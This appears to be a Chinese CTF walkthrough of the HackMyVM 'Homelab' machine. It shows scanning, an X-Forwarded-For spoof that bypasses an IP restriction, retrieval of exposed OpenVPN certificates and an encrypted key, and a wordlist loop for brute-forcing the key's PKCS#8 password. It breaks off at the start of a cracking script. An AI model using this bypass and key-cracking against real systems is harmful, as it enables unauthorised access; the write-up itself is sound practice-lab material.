# hackmyvm homelab 测试记录

 


[大佬WP](https://www.bilibili.com/video/BV1gN5WzMEB5)




### 1. 基本信息

```
靶机链接：
https://hackmyvm.eu/machines/machine.php?vm=Homelab
https://maze-sec.com/library/
```

```shell
难度：⭐️⭐️⭐️
知识点：扫描，`bypass-403`工具，爆破`PKCS#8`密码，`openvpn`使用，家目录文件提权
```

### 2. 信息收集

### Nmap

```shell
└─# arp-scan -l | grep PCS
192.168.31.65   82:76:60:93:03:34       (Unknown: locally administered)
└─# IP=192.168.31.65
└─# nmap -sV -sC -A $IP -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 19:16 CST
Nmap scan report for homelab (192.168.31.65)
Host is up (0.0017s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.62 ((Unix))
|_http-title: Mac OS X Server
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.62 (Unix)
|_http-favicon: Apache on Mac OS X
MAC Address: 82:76:60:93:03:34 (Unknown)
```

### 目录扫描

```shell
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP -x.txt,.php,.h
└─# dirsearch -u http://$IP  -x 403 -e txt,php,html
[19:19:13] 200 -  820B  - /cgi-bin/printenv
[19:19:13] 200 -    1KB - /cgi-bin/test-cgi
[19:19:15] 200 -    4KB - /error.html
[19:19:15] 200 -    8KB - /favicon.ico
[19:19:22] 301 -  313B  - /script  ->  http://192.168.31.65/script/
[19:19:22] 301 -  319B  - /service?Wsdl  ->  http://192.168.31.65/service/?Wsdl
[19:19:22] 301 -  314B  - /service  ->  http://192.168.31.65/service/
[19:19:23] 301 -  312B  - /style  ->  http://192.168.31.65/style/
```

看群主`wp`介绍`style是css`，`script是js`，所以入口点就是`service`。继续扫`service` 目录

```shell
└─# dirsearch -u http://$IP/service  -x 403 -e txt,php,html
[19:32:12] Starting: service/
[19:32:20] 200 -    1KB - /service/ca.crt
```

用`dirsearch`扫到`ca.crt`(遗憾的是`gobuster` 字典居然没有),取下来

```shell
└─# curl http://$IP/service/ca.crt
-----BEGIN CERTIFICATE-----
MIIDSDCCAjCgAwIBAgIUFsI+zOonAvZQA+m8UZ5NUujMpKswDQYJKoZIhvcNAQEL
BQAwFTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE2NDJaFw0zNTA0
MTMxNjE2NDJaMBUxEzARBgNVBAMMCk15LUhvbWUgQ0EwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDdeTDZboEmIg6d+KahlCJ/Gr4cKp4NvGJJU25AOxqb
QBHJp4zWuMN6VLkxMfXfOzpwsQK+noyjtpZSR8JrsmFz8OaBI0KK7FNyPLNWYyEY
PJ+kzNMf+RRmbA2xNkIHms7j4ziSylmHYebHAmxCscS6cH/R4XyFNp1GdXe/3iJL
dALNo6jymspAVR+x2/E7K/bCg9d7JLny9ZCLxXbVIIIjd8quMFKyJ3ZBfsFdY6ym
T6W0NY2fQYQKSR/6LparsgIlVM06Qpykdog3V12z8+8XALZNw0My5Y9TbMgtDovV
+y1RFRMK1mTNuUU2vriM/q7n/zFb5hJsZwiJ3m4exMuvAgMBAAGjgY8wgYwwDAYD
VR0TBAUwAwEB/zAdBgNVHQ4EFgQUZZObZvJY/XwuV84kcWdjIXIMi3EwUAYDVR0j
BEkwR4AUZZObZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhv
bWUgQ0GCFBbCPszqJwL2UAPpvFGeTVLozKSrMAsGA1UdDwQEAwIBBjANBgkqhkiG
9w0BAQsFAAOCAQEAlFOyWCn96KRBq0b6QYWRhqWbhDeMJD+EhwKK2JeMUzLc2XOy
91/kSbvquVuohif8xkg4J6uVuLwNGOjuFo8mooLYzHKZGXkmpEo66PyswbnguAD9
QuPLYHJ63vwUvIATv5WpH9ZWUxaMYaqU9SgHrcqi86jNOOds4j/07VWmslnRO3GX
S/THLanVD9zlrXJNnu1x6g+nUddXsI6OON5nGlO4ki8a5nt+2GnJ+3vGvc4w44Gu
AXWl/rl/AIv1UAph/Pm25U/BK4FjWSIO3Gx1YvZkwqUnpnN8wr2KF3oB01Y0w6dD
e2okw+XCzCMr1SP+UihU5h4zSMQi6/Tf4e0HDw==
-----END CERTIFICATE-----

└─# echo ''> id
└─# chmod 600 id
#看清楚不是私钥
```

访问网页返回服务仅供自己使用

```shell
└─# curl http://$IP/service/
Whoa! But sorry, this service is only available for myself!
```

##### `bypass-403`工具

先用`bypass-403`工具试一下

```shell
#工具
https://github.com/iamj0ker/bypass-403
./bypass-403.sh website-here path-here
/CTF/bypass-403.sh http://$IP/service
```

过滤`$IP\service\` 页面的默认`59`长度返回内容后，没啥有用信息

```shell
└─# /CTF/bypass-403.sh http://$IP/service
/CTF/bypass-403.sh: 行 2: figlet: 未找到命令
                                               By Iam_J0ker
./bypass-403.sh https://example.com path

200,59  --> http://192.168.31.65/service/
200,59  --> http://192.168.31.65/service/%2e/
200,59  --> http://192.168.31.65/service//.
200,59  --> http://192.168.31.65/service////
200,59  --> http://192.168.31.65/service/.//./
200,59  --> http://192.168.31.65/service/ -H X-Original-URL:
200,59  --> http://192.168.31.65/service/ -H X-Custom-IP-Authorization: 127.0.0.1
200,59  --> http://192.168.31.65/service/ -H X-Forwarded-For: http://127.0.0.1
200,59  --> http://192.168.31.65/service/ -H X-Forwarded-For: 127.0.0.1:80
200,59  --> http://192.168.31.65/service -H X-rewrite-url:
404,273  --> http://192.168.31.65/service/%20
404,273  --> http://192.168.31.65/service/%09
200,59  --> http://192.168.31.65/service/?
403,276  --> http://192.168.31.65/service/.html
200,59  --> http://192.168.31.65/service//?anything
200,59  --> http://192.168.31.65/service/#
200,59  --> http://192.168.31.65/service/ -H Content-Length:0 -X POST
404,273  --> http://192.168.31.65/service//*
404,273  --> http://192.168.31.65/service/.php
404,273  --> http://192.168.31.65/service/.json
200,87  --> http://192.168.31.65/service/  -X TRACE
200,59  --> http://192.168.31.65/service/ -H X-Host: 127.0.0.1
404,273  --> http://192.168.31.65/service/..;/
000,0  --> http://192.168.31.65/service/;/
200,87  --> http://192.168.31.65/service/ -X TRACE
200,59  --> http://192.168.31.65/service/ -H X-Forwarded-Host: 127.0.0.1
Way back machine:
/CTF/bypass-403.sh: 行 60: jq: 未找到命令
└─# curl http://$IP/service/ | wc -l
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    59  100    59    0     0   6409      0 --:--:-- --:--:-- --:--:--  6555
0
└─# /CTF/bypass-403.sh http://$IP/service | grep -v 59
/CTF/bypass-403.sh: 行 2: figlet: 未找到命令
                                               By Iam_J0ker
./bypass-403.sh https://example.com path

404,273  --> http://192.168.31.65/service/%20
404,273  --> http://192.168.31.65/service/%09
403,276  --> http://192.168.31.65/service/.html
404,273  --> http://192.168.31.65/service//*
404,273  --> http://192.168.31.65/service/.php
404,273  --> http://192.168.31.65/service/.json
200,87  --> http://192.168.31.65/service/  -X TRACE
404,273  --> http://192.168.31.65/service/..;/
000,0  --> http://192.168.31.65/service/;/
200,87  --> http://192.168.31.65/service/ -X TRACE
```

虽然支持`TRACE`，但是没东西返回，重新回到起点

```shell
└─# curl http://192.168.31.65/service/ -X TRACE
TRACE /service/ HTTP/1.1
Host: 192.168.31.65
User-Agent: curl/8.11.0
Accept: */*
```

根据页面提示内容：`服务仅供自己使用`，尝试`X-Forwarded-For`绕过

```shell
└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:127.0.0.1"
Whoa! But sorry, this service is only available for myself!
└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:localhost"
Whoa! But sorry, this service is only available for myself!
└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"
# Last modified by shinosawa
# on 2024-12-21

# Example Configuration File

client
dev tun
proto udp
remote ? ?
resolv-retry infinite
nobind
persist-key
persist-tun
ca ?
cert ?
# Regenerate a STRONG password for the KEY
# Do NOT use a SAME password as other services et. SSH
# it is DANGEROUS!
key ?
cipher AES-256-GCM
verb 3
└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65" | wc -c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   326  100   326    0     0  24234      0 --:--:-- --:--:-- --:--:-- 25076
326
```

测试，只有用对外的`192`网段`ip`时候有返回，结合`gobuster` 扫描的`vpn.txt`文件大小276和`openvpn`知识，上面返回的内容326可能和`vpn.txt`有关

```shell
└─# gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://$IP/service -x.txt

/vpn.txt              (Status: 403) [Size: 276]
```

##### `openvpn`知识

```shell
### 基本部署步骤
1. 安装 OpenVPN  
   sudo apt install openvpn
2. 生成证书和密钥  
   - 使用 EasyRSA 或 OpenSSL 生成 CA 证书、服务器证书和客户端证书。
3. 配置服务器端  
   - 编辑服务器配置文件（如 `server.conf`），指定端口（默认 `udp 1194`）、协议（TCP/UDP）、证书路径等。
4. 配置客户端  
   - 创建客户端配置文件（如 `client.ovpn`），包含服务器 IP、端口、证书等信息。
5. 启动服务  
   sudo systemctl start openvpn@server
```

测试靶机靶机上`openvpn`服务对应的`udp 1194`端口已开放

```shell
└─# nmap -sU $IP -p 1194
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-14 20:19 CST
Nmap scan report for homelab (192.168.31.65)
Host is up (0.0013s latency).

PORT     STATE SERVICE
1194/udp open  openvpn
MAC Address: 82:76:60:93:03:34 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.39 seconds
```

所以猜测作者的思路是，构建`VPN`，通过`vpn`连接靶机`ip`，靶机的`ssh`服务只开在`vpn`对应的地址

```sh
#在 OpenVPN 的默认证书认证模式下，客户端必须配置 client.key（私钥）和 client.crt（客户端证书）文件

- OpenVPN 默认使用 SSL/TLS 证书双向认证，即服务器和客户端都需要提供证书。
- 服务端通过 `ca.crt`（根证书）验证客户端证书（`client.crt`）是否由可信 CA 签发。
- 客户端私钥（`client.key`）用于生成加密签名，证明客户端拥有该证书的合法权限。
```

需要找到客户端所需的` client.key`（私钥）和` client.crt`（客户端证书）文件,直接在`ca.crt`所在的路径就请求成功了。

```shell
└─# curl http://$IP/service/ca.crt > /tmp/ca.crt
└─# curl http://$IP/service/client.crt > /tmp/client.crt
└─# curl http://$IP/service/client.key > /tmp/client.key
└─# curl http://$IP/service/client.key
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFJDBWBgkqhkiG9w0BBQ0wSTAxBgkqhkiG9w0BBQwwJAQQcjQTElcIKFeDw72A
xT/14gICCAAwDAYIKoZIhvcNAgkFADAUBggqhkiG9w0DBwQIVNMjRXSbGKgEggTI
o2XhzDmt4VwIs9a2+TlCU8B9wfv4CKyoX6kqbmbEjwnUtIjV6ouTAdp423q8aEMP
9vIPo/QUvnAAcxflWs0JAg9cDN9Mix1TygNaqtiOnfodE/powg2+HJH58byf3C2/
L9i/Eyhy4PUFBocAQEMcL+OOlhV6N/K+YI26UpM3cb1W/bZa/D1kitPTc3aNaEcm
cik0vozX4LaCAkWUkrfQTDmWy30nvSGlByAOrdKTdc73ZKYjhfJ0aBAvnr3l9YJ1
6P5GZ4plb0rsATaxKJX2qlza9CeAVtEBYxJXtLsv82ydLhdV9QIfL971GRwT7ufJ
O04GlQnnD1+RXsgX/HX8TlqtWB+cNHPXU5goKoV98vMU9LhOLkgBt+F8VBXngXSa
x/6vVA2JTq14GAuVptRRvk3NWspXbWPcEfeIRjagP1+d2eIZB6Jf3KNqFzlEZJBg
9sVFw8K4Kl1y46A767/6zAgR1yWxZUIu4DqqxrD/J+jefqEzHEpWs/hKkqDFOiY+
rtTiaG1DwVMw+EUCOOkWlzgC+J+z4ne26NxlRrDEIg85X5UfDnbDzQcvTOq8QZHF
QH0OMFtKVT3EnKyChVSKDSjSBoMV6DjWB1BGI9SIaca5yKjtYJm9ZKgc319XnuDH
LCHIQfERyaTypf87MAahh0P43ZUn4FJoH7DVa4R4lluyJnwr3fXcPdN+lmVAlH/b
fLsGy3NNjBjNqUgkr923SOoTQXtz8HN1TSM/P11w6udvjOcHtBTV+eRczkBStvPV
W0OqZMPGDaEg+HGsdQt3moGxRwgP7HEHp7IRR1mvHHjtg4UgflDtfa5BfxEOlWyF
p/aV4JTVWsBhV6jEEhtY2+5vvhRammSvW6+HWqpicEE0Kekm5lf9hh3jNvXPbeuP
gV000gW7ZfHRmIbfGn1/RQtizqxBDrzjPsXIvrnsR5kdqWuDYdI3681QErb7txoX
+7urFS1MErtwmMIxsjkKgZyxzn71CHrSRwxlPSJMOe4LWprVk92By533yuccJXNx
Lk63VtvH/H+EPeFisTnX2rN7Y4Yz/k+wbJH7cyS5PMu0I49scZPqWnZwEd+6SyKq
3AkTXtytghizriWnxlq4dzaAUjDGCnR9vqy8cNgpJRwQTczorCqRf+3vf8oji0b+
IeyTNyJeS+S8YEoFSxCHVdSy1YS7EnXWAF7fV49Rpwz8kzdi+dGVXyF9oxp+XAM5
827TdKT0NueVxakHRqm6Px23xQHvfPn2lYbzX1C1piLRFAXOk+5l7VflLoCl5QnN
UjzWysu0morMJ8d4nrhaCzcUQc55lJJoX5VU3tRrAjQ1yDhmKKQ0Ga3iGiA3CGop
BNj4qIST98Z/fcVT79ZP0kykcD91KNOQsJz7Zc6gJvat2EbCZksj584981bySrgA
vWJ/0ikaF2+PrVHrKMi6cn75Eiz2fO2xovr8q8sh0n3iegHvAmXRhU2zb2DEjTWk
X+UgNh/LzoYJEkFE+atB7QnPy5TB+HQF/UW22ZAygXkzVdk8Wl36hlsDNtz+wvOd
uLEkpu2zKwKZ8dMPodNQy8z1ax+NwtVRK2ttrmhbTdmlmk24lrlz3Wp9u0AwB4WD
Q0fWBgB3vyBO+VTniw+CHZ+JRsXAYTue
-----END ENCRYPTED PRIVATE KEY-----

└─# curl http://$IP/service/client.crt
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            a4:f5:ca:c7:e6:4b:ce:66:c4:2d:f3:b1:aa:17:77:72
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: CN=My-Home CA
        Validity
            Not Before: Apr 15 16:17:17 2025 GMT
            Not After : Jul 19 16:17:17 2027 GMT
        Subject: CN=client1
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                Public-Key: (2048 bit)
                Modulus:
                    00:a4:18:af:59:be:6f:36:31:64:7f:6b:60:da:ba:
                    ec:89:3e:10:7b:90:4c:99:1b:55:fe:d2:c1:77:8d:
                    47:15:a9:59:f8:df:9c:48:ed:32:0a:2c:56:fa:00:
                    7d:81:b4:94:a5:09:31:fa:d9:16:98:a9:bc:64:3c:
                    bf:aa:9d:c3:89:9d:3c:ff:3a:25:54:bf:c4:e7:a2:
                    2c:51:16:a6:ba:84:03:72:da:98:9f:ba:e5:5c:cf:
                    72:62:7d:80:51:20:a0:ba:11:4f:d9:ce:5c:67:2c:
                    40:60:18:c4:8d:d3:6e:04:9a:34:84:12:f1:af:a3:
                    a8:74:17:e7:7a:58:e4:48:3e:44:2b:5d:48:56:60:
                    64:64:06:e4:00:86:1e:f6:79:da:84:4e:c5:11:1d:
                    2a:d3:20:bf:5c:d8:30:32:5b:6b:af:64:06:d0:5d:
                    9b:4e:6b:89:87:44:d0:6c:55:cc:6a:c8:ef:83:65:
                    bf:ac:3a:bc:9e:0a:9f:9d:d3:4b:af:42:05:db:b7:
                    b3:b7:4c:cb:3a:6f:89:63:53:77:10:c0:c6:10:bf:
                    fb:04:08:21:0f:30:39:ce:58:72:3a:76:3d:68:aa:
                    2a:db:5f:1f:f1:df:8d:f5:e8:bb:22:ca:0a:5c:39:
                    e0:d6:57:57:a8:c5:0c:39:1a:4f:42:d5:38:18:f0:
                    70:09
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Basic Constraints:
                CA:FALSE
            X509v3 Subject Key Identifier:
                0C:00:84:70:42:07:FE:16:5D:8C:E4:63:95:F7:34:AD:7F:2E:EA:DD
            X509v3 Authority Key Identifier:
                keyid:65:93:9B:66:F2:58:FD:7C:2E:57:CE:24:71:67:63:21:72:0C:8B:71
                DirName:/CN=My-Home CA
                serial:16:C2:3E:CC:EA:27:02:F6:50:03:E9:BC:51:9E:4D:52:E8:CC:A4:AB
            X509v3 Extended Key Usage:
                TLS Web Client Authentication
            X509v3 Key Usage:
                Digital Signature
    Signature Algorithm: sha256WithRSAEncryption
    Signature Value:
        7d:c5:8c:04:97:a2:98:d0:dc:74:6f:ca:f7:07:86:01:a6:91:
        0b:70:58:87:62:6b:f7:cd:9e:4a:32:41:2b:bd:03:ed:88:42:
        c1:ec:7b:92:b1:91:cb:ab:a0:84:4f:be:33:4c:9d:c0:d9:1c:
        54:03:a1:fc:a2:96:c4:62:a1:76:78:ca:eb:7f:0c:5d:f5:ac:
        fe:1f:bc:96:aa:13:38:50:04:f2:ca:f8:f5:4d:28:c6:20:8a:
        45:b3:bb:1c:b4:69:2a:05:14:ed:ba:94:e8:d3:39:42:81:7a:
        1d:15:35:d6:19:2b:e1:83:3c:3a:7b:73:76:39:c1:46:69:94:
        44:5a:eb:91:2b:7c:d3:02:9f:23:47:8a:94:86:d4:86:fd:65:
        2c:7e:98:c6:a2:6f:8e:a7:3a:26:f7:44:f3:18:fc:f5:70:3c:
        7b:a5:d9:5f:53:2d:c5:c8:28:a8:ef:03:44:1a:7e:97:cc:57:
        1d:7c:24:a4:b6:cb:cf:e5:94:1a:e6:72:51:24:d0:52:ba:79:
        01:04:81:34:49:f3:81:02:46:88:e5:14:86:fb:8f:74:09:36:
        7a:ab:f9:80:e3:ca:c3:b9:16:0f:25:f1:dd:ec:93:f0:4e:af:
        f6:77:1c:94:9a:31:3d:6a:3c:d6:b2:35:41:79:56:b7:7c:c8:
        90:a0:e8:d6
-----BEGIN CERTIFICATE-----
MIIDVDCCAjygAwIBAgIRAKT1ysfmS85mxC3zsaoXd3IwDQYJKoZIhvcNAQELBQAw
FTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE3MTdaFw0yNzA3MTkx
NjE3MTdaMBIxEDAOBgNVBAMMB2NsaWVudDEwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQCkGK9Zvm82MWR/a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI
7TIKLFb6AH2BtJSlCTH62RaYqbxkPL+qncOJnTz/OiVUv8TnoixRFqa6hANy2pif
uuVcz3JifYBRIKC6EU/ZzlxnLEBgGMSN024EmjSEEvGvo6h0F+d6WORIPkQrXUhW
YGRkBuQAhh72edqETsURHSrTIL9c2DAyW2uvZAbQXZtOa4mHRNBsVcxqyO+DZb+s
OryeCp+d00uvQgXbt7O3TMs6b4ljU3cQwMYQv/sECCEPMDnOWHI6dj1oqirbXx/x
34316LsiygpcOeDWV1eoxQw5Gk9C1TgY8HAJAgMBAAGjgaEwgZ4wCQYDVR0TBAIw
ADAdBgNVHQ4EFgQUDACEcEIH/hZdjORjlfc0rX8u6t0wUAYDVR0jBEkwR4AUZZOb
ZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhvbWUgQ0GCFBbC
PszqJwL2UAPpvFGeTVLozKSrMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE
AwIHgDANBgkqhkiG9w0BAQsFAAOCAQEAfcWMBJeimNDcdG/K9weGAaaRC3BYh2Jr
982eSjJBK70D7YhCwex7krGRy6ughE++M0ydwNkcVAOh/KKWxGKhdnjK638MXfWs
/h+8lqoTOFAE8sr49U0oxiCKRbO7HLRpKgUU7bqU6NM5QoF6HRU11hkr4YM8Ontz
djnBRmmURFrrkSt80wKfI0eKlIbUhv1lLH6YxqJvjqc6JvdE8xj89XA8e6XZX1Mt
xcgoqO8DRBp+l8xXHXwkpLbLz+WUGuZyUSTQUrp5AQSBNEnzgQJGiOUUhvuPdAk2
eqv5gOPKw7kWDyXx3eyT8E6v9ncclJoxPWo81rI1QXlWt3zIkKDo1g==
-----END CERTIFICATE-----
```

拿着下面内容让`ai`组合一个

```shell
└─# curl http://192.168.31.65/service/ -H "X-Forwarded-For:192.168.31.65"
└─# curl http://$IP/service/ca.crt
└─# curl http://$IP/service/client.crt 
└─# curl http://$IP/service/client.key
组合以下，形成一个ovpn文件
```

以下是`ai`整合后的完整 `client.ovpn` 文件内容，已嵌入证书和密钥

```
# OpenVPN 客户端配置文件
client
dev tun
proto udp
remote 192.168.31.65 1194  # 替换为实际服务器公网 IP（若为内网则需公网映射）
resolv-retry infinite
nobind
persist-key
persist-tun

# 内嵌 CA 根证书
<ca>
-----BEGIN CERTIFICATE-----
MIIDSDCCAjCgAwIBAgIUFsI+zOonAvZQA+m8UZ5NUujMpKswDQYJKoZIhvcNAQEL
BQAwFTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE2NDJaFw0zNTA0
MTMxNjE2NDJaMBUxEzARBgNVBAMMCk15LUhvbWUgQ0EwggEiMA0GCSqGSIb3DQEB
AQUAA4IBDwAwggEKAoIBAQDdeTDZboEmIg6d+KahlCJ/Gr4cKp4NvGJJU25AOxqb
QBHJp4zWuMN6VLkxMfXfOzpwsQK+noyjtpZSR8JrsmFz8OaBI0KK7FNyPLNWYyEY
PJ+kzNMf+RRmbA2xNkIHms7j4ziSylmHYebHAmxCscS6cH/R4XyFNp1GdXe/3iJL
dALNo6jymspAVR+x2/E7K/bCg9d7JLny9ZCLxXbVIIIjd8quMFKyJ3ZBfsFdY6ym
T6W0NY2fQYQKSR/6LparsgIlVM06Qpykdog3V12z8+8XALZNw0My5Y9TbMgtDovV
+y1RFRMK1mTNuUU2vriM/q7n/zFb5hJsZwiJ3m4exMuvAgMBAAGjgY8wgYwwDAYD
VR0TBAUwAwEB/zAdBgNVHQ4EFgQUZZObZvJY/XwuV84kcWdjIXIMi3EwUAYDVR0j
BEkwR4AUZZObZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhv
bWUgQ0GCFBbCPszqJwL2UAPpvFGeTVLozKSrMAsGA1UdDwQEAwIBBjANBgkqhkiG
9w0BAQsFAAOCAQEAlFOyWCn96KRBq0b6QYWRhqWbhDeMJD+EhwKK2JeMUzLc2XOy
91/kSbvquVuohif8xkg4J6uVuLwNGOjuFo8mooLYzHKZGXkmpEo66PyswbnguAD9
QuPLYHJ63vwUvIATv5WpH9ZWUxaMYaqU9SgHrcqi86jNOOds4j/07VWmslnRO3GX
S/THLanVD9zlrXJNnu1x6g+nUddXsI6OON5nGlO4ki8a5nt+2GnJ+3vGvc4w44Gu
AXWl/rl/AIv1UAph/Pm25U/BK4FjWSIO3Gx1YvZkwqUnpnN8wr2KF3oB01Y0w6dD
e2okw+XCzCMr1SP+UihU5h4zSMQi6/Tf4e0HDw==
-----END CERTIFICATE-----
</ca>

# 内嵌客户端证书
<cert>
-----BEGIN CERTIFICATE-----
MIIDVDCCAjygAwIBAgIRAKT1ysfmS85mxC3zsaoXd3IwDQYJKoZIhvcNAQELBQAw
FTETMBEGA1UEAwwKTXktSG9tZSBDQTAeFw0yNTA0MTUxNjE3MTdaFw0yNzA3MTkx
NjE3MTdaMBIxEDAOBgNVBAMMB2NsaWVudDEwggEiMA0GCSqGSIb3DQEBAQUAA4IB
DwAwggEKAoIBAQCkGK9Zvm82MWR/a2DauuyJPhB7kEyZG1X+0sF3jUcVqVn435xI
7TIKLFb6AH2BtJSlCTH62RaYqbxkPL+qncOJnTz/OiVUv8TnoixRFqa6hANy2pif
uuVcz3JifYBRIKC6EU/ZzlxnLEBgGMSN024EmjSEEvGvo6h0F+d6WORIPkQrXUhW
YGRkBuQAhh72edqETsURHSrTIL9c2DAyW2uvZAbQXZtOa4mHRNBsVcxqyO+DZb+s
OryeCp+d00uvQgXbt7O3TMs6b4ljU3cQwMYQv/sECCEPMDnOWHI6dj1oqirbXx/x
34316LsiygpcOeDWV1eoxQw5Gk9C1TgY8HAJAgMBAAGjgaEwgZ4wCQYDVR0TBAIw
ADAdBgNVHQ4EFgQUDACEcEIH/hZdjORjlfc0rX8u6t0wUAYDVR0jBEkwR4AUZZOb
ZvJY/XwuV84kcWdjIXIMi3GhGaQXMBUxEzARBgNVBAMMCk15LUhvbWUgQ0GCFBbC
PszqJwL2UAPpvFGeTVLozKSrMBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE
AwIHgDANBgkqhkiG9w0BAQsFAAOCAQEAfcWMBJeimNDcdG/K9weGAaaRC3BYh2Jr
982eSjJBK70D7YhCwex7krGRy6ughE++M0ydwNkcVAOh/KKWxGKhdnjK638MXfWs
/h+8lqoTOFAE8sr49U0oxiCKRbO7HLRpKgUU7bqU6NM5QoF6HRU11hkr4YM8Ontz
djnBRmmURFrrkSt80wKfI0eKlIbUhv1lLH6YxqJvjqc6JvdE8xj89XA8e6XZX1Mt
xcgoqO8DRBp+l8xXHXwkpLbLz+WUGuZyUSTQUrp5AQSBNEnzgQJGiOUUhvuPdAk2
eqv5gOPKw7kWDyXx3eyT8E6v9ncclJoxPWo81rI1QXlWt3zIkKDo1g==
-----END CERTIFICATE-----
</cert>

# 内嵌客户端私钥（需输入密码）
<key>
-----BEGIN ENCRYPTED PRIVATE KEY-----
MIIFJDBWBgkqhkiG9w0BBQ0wSTAxBgkqhkiG9w0BBQwwJAQQcjQTElcIKFeDw72A
xT/14gICCAAwDAYIKoZIhvcNAgkFADAUBggqhkiG9w0DBwQIVNMjRXSbGKgEggTI
o2XhzDmt4VwIs9a2+TlCU8B9wfv4CKyoX6kqbmbEjwnUtIjV6ouTAdp423q8aEMP
9vIPo/QUvnAAcxflWs0JAg9cDN9Mix1TygNaqtiOnfodE/powg2+HJH58byf3C2/
L9i/Eyhy4PUFBocAQEMcL+OOlhV6N/K+YI26UpM3cb1W/bZa/D1kitPTc3aNaEcm
cik0vozX4LaCAkWUkrfQTDmWy30nvSGlByAOrdKTdc73ZKYjhfJ0aBAvnr3l9YJ1
6P5GZ4plb0rsATaxKJX2qlza9CeAVtEBYxJXtLsv82ydLhdV9QIfL971GRwT7ufJ
O04GlQnnD1+RXsgX/HX8TlqtWB+cNHPXU5goKoV98vMU9LhOLkgBt+F8VBXngXSa
x/6vVA2JTq14GAuVptRRvk3NWspXbWPcEfeIRjagP1+d2eIZB6Jf3KNqFzlEZJBg
9sVFw8K4Kl1y46A767/6zAgR1yWxZUIu4DqqxrD/J+jefqEzHEpWs/hKkqDFOiY+
rtTiaG1DwVMw+EUCOOkWlzgC+J+z4ne26NxlRrDEIg85X5UfDnbDzQcvTOq8QZHF
QH0OMFtKVT3EnKyChVSKDSjSBoMV6DjWB1BGI9SIaca5yKjtYJm9ZKgc319XnuDH
LCHIQfERyaTypf87MAahh0P43ZUn4FJoH7DVa4R4lluyJnwr3fXcPdN+lmVAlH/b
fLsGy3NNjBjNqUgkr923SOoTQXtz8HN1TSM/P11w6udvjOcHtBTV+eRczkBStvPV
W0OqZMPGDaEg+HGsdQt3moGxRwgP7HEHp7IRR1mvHHjtg4UgflDtfa5BfxEOlWyF
p/aV4JTVWsBhV6jEEhtY2+5vvhRammSvW6+HWqpicEE0Kekm5lf9hh3jNvXPbeuP
gV000gW7ZfHRmIbfGn1/RQtizqxBDrzjPsXIvrnsR5kdqWuDYdI3681QErb7txoX
+7urFS1MErtwmMIxsjkKgZyxzn71CHrSRwxlPSJMOe4LWprVk92By533yuccJXNx
Lk63VtvH/H+EPeFisTnX2rN7Y4Yz/k+wbJH7cyS5PMu0I49scZPqWnZwEd+6SyKq
3AkTXtytghizriWnxlq4dzaAUjDGCnR9vqy8cNgpJRwQTczorCqRf+3vf8oji0b+
IeyTNyJeS+S8YEoFSxCHVdSy1YS7EnXWAF7fV49Rpwz8kzdi+dGVXyF9oxp+XAM5
827TdKT0NueVxakHRqm6Px23xQHvfPn2lYbzX1C1piLRFAXOk+5l7VflLoCl5QnN
UjzWysu0morMJ8d4nrhaCzcUQc55lJJoX5VU3tRrAjQ1yDhmKKQ0Ga3iGiA3CGop
BNj4qIST98Z/fcVT79ZP0kykcD91KNOQsJz7Zc6gJvat2EbCZksj584981bySrgA
vWJ/0ikaF2+PrVHrKMi6cn75Eiz2fO2xovr8q8sh0n3iegHvAmXRhU2zb2DEjTWk
X+UgNh/LzoYJEkFE+atB7QnPy5TB+HQF/UW22ZAygXkzVdk8Wl36hlsDNtz+wvOd
uLEkpu2zKwKZ8dMPodNQy8z1ax+NwtVRK2ttrmhbTdmlmk24lrlz3Wp9u0AwB4WD
Q0fWBgB3vyBO+VTniw+CHZ+JRsXAYTue
-----END ENCRYPTED PRIVATE KEY-----
</key>

# 加密算法配置
cipher AES-256-GCM
verb 3
```

### 4.获得shinosawa

##### 爆破私钥`PKCS#8`密码

注意`client.key`是`PKCS#8`加密文件,需解密

```shell
└─# curl http://$IP/service/client.key
-----BEGIN ENCRYPTED PRIVATE KEY-----
...
└─#   openssl pkcs8 -in client.key -out de.txt -passin pass:123
#可以通过这种方式去才密码
└─# for i in $(cat /CTF/suForce_dir/top12000.txt);do echo $i;openssl pkcs8 -in client.key -out de.txt -passin pass:$i;[ $?  -eq 0] && break ;done
```

看来字典小了，换个超大的字典，用`ai`写个多线程爆破python脚本

```python
#!/usr/bin/env python3
import subprocess
import sys
import threading
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

# 配置项
KEY_FILE = "client.key"        # 目标私钥文件
